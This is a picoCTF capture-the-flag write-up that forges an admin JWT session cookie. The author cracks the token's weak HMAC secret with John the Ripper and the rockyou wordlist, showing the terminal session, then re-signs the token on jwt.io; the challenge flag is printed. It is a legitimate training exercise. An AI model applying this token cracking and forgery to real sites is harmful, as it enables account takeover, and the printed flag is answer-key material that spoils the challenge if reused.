## Goal

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864
## Solution
+ Open the link and enter a random user name
+ Before that I installed a browser extension called coockie editor
+ When I logged in it must have generated a cookie.
+ I open the extension and I see that there is a coockie, I see that it has a value assigned, I copy that value and paste it in a web tool [jwt](https://jwt.io/)
+ In the payload section I change the username to admin and copy the new generated token.
+ The token that I had generated I paste it in the coockie editor in the coockie that had been generated in the challenge web page.
+ An error was generated, so we have to delete the coockie and restart the page.
+ I log back into the page, copy the cookie and save it in a file in the terminal.
+ I use a tool known as jhon the reapper to get passwords, I'm going to use it specifically to get the password.
+ I obtain the password **ilovepico**, I go to the JTW tool, I modify the signature adding the password previously obtained, I copy the token and paste it in the cookie that I had generated in the challenge page, I save it and I obtain the password.

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ nano coockie
                                                                                     
┌──(kali㉿kali)-[~/Documents]
└─$ cat coockie 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiQWxpIn0.RNOzzxv4vF7ZZa4N7Flq30wX7FbH5oxy785j5ZyCCkY
                                                                                     
┌──(kali㉿kali)-[~/Documents]
└─$ ls /usr/share/wordlists 
amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt.gz  wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    sqlmap.txt      wifite.txt
                                                                                     
┌──(kali㉿kali)-[~/Documents]
└─$ gzip -d /usr/share/wordlists/rockyou.txt.gz 
gzip: /usr/share/wordlists/rockyou.txt: Permission denied
                                                                                     
┌──(kali㉿kali)-[~/Documents]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
[sudo] password for kali: 
                                                                                     
┌──(kali㉿kali)-[~/Documents]
└─$ ls /usr/share/wordlists                         
amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt  wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    sqlmap.txt   wifite.txt
──(kali㉿kali)-[~/Documents]
└─$ john coockie -w=/usr/share/wordlists/rockyou.txt                    
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:03 DONE (2024-03-03 21:38) 0.3134g/s 2318Kp/s 2318Kc/s 2318KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed
````
picoCTF{jawt_was_just_what_you_thought_1ca14548}
## Notes

+ John the Ripper
	+ Password recovery: If you have forgotten your password, you can use John the Ripper to try to crack it.
	+ Security testing: You can use John the Ripper to test the security of your organisation's passwords.
	+ Forensic analysis: John the Ripper can be used to analyse forensic data for passwords.
+ jwt.io
	+ JWT Debugging: If you have problems with a JWT, you can use jwt.io to decode it and view its contents.
	+ JWT signature verification: You can use jwt.io to verify the signature of a JWT to make sure it has not been tampered with.
	+ JWT content scanning: You can use jwt.io to scan the content of a JWT to understand what information it contains.
## References

- [John the Ripper](https://www.openwall.com/john/](https://www.openwall.com/john/)
- [jwt.io](https://jwt.io/)